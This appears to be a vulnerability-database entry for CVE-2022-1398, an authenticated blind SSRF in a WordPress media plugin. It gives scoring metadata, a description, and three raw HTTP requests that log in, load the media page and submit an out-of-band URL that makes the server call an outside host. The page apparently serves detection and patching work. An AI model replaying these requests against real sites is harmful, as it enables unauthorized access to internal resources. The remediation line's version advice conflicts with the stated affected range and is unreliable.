---
layout: post
cve_id: CVE-2022-1398
title: External Media without Import <=1.1.2 - Authenticated Blind Server-Side Request
  Forgery
pcap: true
pcap_path: /pcaps/2022/CVE-2022-1398.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2022/CVE-2022-1398.yaml
snort2_rule: N/A
snort3_rule: N/A
author: theamanrawat
severity: medium
impact: 'Successful exploitation of this vulnerability could allow an attacker to
  bypass network restrictions, access internal resources, and potentially perform
  further attacks.

  '
remediation: 'Upgrade to External Media without Import plugin version 1.1.2 or later.

  '
reference:
- https://wpscan.com/vulnerability/5440d177-e995-403e-b2c9-42ceda14579e
- https://wordpress.org/plugins/external-media-without-import/
- https://nvd.nist.gov/vuln/detail/CVE-2022-1398
- https://github.com/ARPSyndicate/cvemon
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N
  cvss-score: 6.5
  cve-id: CVE-2022-1398
  cwe-id: CWE-918
  epss-score: 0.48896
  epss-percentile: 0.97663
  cpe: cpe:2.3:a:external_media_without_import_project:external_media_without_import:*:*:*:*:*:wordpress:*:*
metadata:
  verified: true
  max-request: 3
  vendor: external_media_without_import_project
  product: external_media_without_import
  framework: wordpress
tags:
- cve2022
- cve
- ssrf
- wordpress
- wp-plugin
- wp
- wpscan
- external-media-without-import
- authenticated
- intrusive
- external_media_without_import_project
- vuln
---

## ðŸ” Vulnerability Description
WordPress External Media without Import plugin through 1.1.2 is susceptible to authenticated blind server-side request forgery. The plugin has no authorization and does not ensure that media added via URLs are external media, which can allow any authenticated users, including subscribers, to obtain sensitive information, modify data, and/or execute unauthorized administrative operations.


## ðŸŒ HTTP Request
```nohighlight
POST /wp-login.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1 Safari/605.1.15
Connection: close
Content-Length: 38
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

log=TAr4fC&pwd=2nTWYc&wp-submit=Log+In
```

```nohighlight
GET /wp-admin/upload.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Connection: close
Accept-Encoding: gzip
```

```nohighlight
POST /wp-admin/admin-post.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0
Connection: close
Content-Length: 128
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

urls=http%3A%2F%2Fd5isf0hle0o16q7uoesg5qph474pi1z39.oast.site&width=&height=&mime-type=&action=add_external_media_without_import
```

